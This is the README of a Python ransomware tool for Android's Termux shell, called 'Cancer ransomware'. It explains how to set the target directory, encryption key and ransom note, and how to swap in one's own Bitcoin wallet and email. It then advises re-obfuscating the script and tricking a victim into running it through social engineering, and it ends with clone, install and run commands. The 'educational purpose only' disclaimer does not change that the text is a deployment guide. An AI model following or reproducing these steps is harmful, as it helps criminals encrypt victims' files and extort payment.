# Cancer ransomware



  Cancer ransomware is an android shell ransomware type which encrypt the given file in directory using AES key

  


  Firstly de-obfuscate the variable encrypted script


  Then in line 35 you can change the directory to the android directory or you can leave it by default


  Then in line 36 you can replace the encryption key with your own encryption key or you can leave it by defualt
  the encryption key should be in hashes e.g like an hashed password
   

  Then in line 169 you can replace the ransom note with your own ransom ransom note or leave it by default
  but dont forget to replace the btc wallet address and the email address to your own address

 
  


  This is a shell type of android ransomware written in python not a self executable type in app format

 
  Be careful when running it on your shell


  You can re-obfuscate the malware back and rename the script 
  and send the script to your victim to run on his termux using social engineering trick



  

  For educational purpose only......
  
  

  I wont be responsible for any malicious use of this tool.......

# Command


 git clone https://github.com/Gbolahanomostosho/Cancer-ransomware





 cd Cancer-ransomware




 pip install -r requirements.txt




 python Cancer-ransomware.py





 
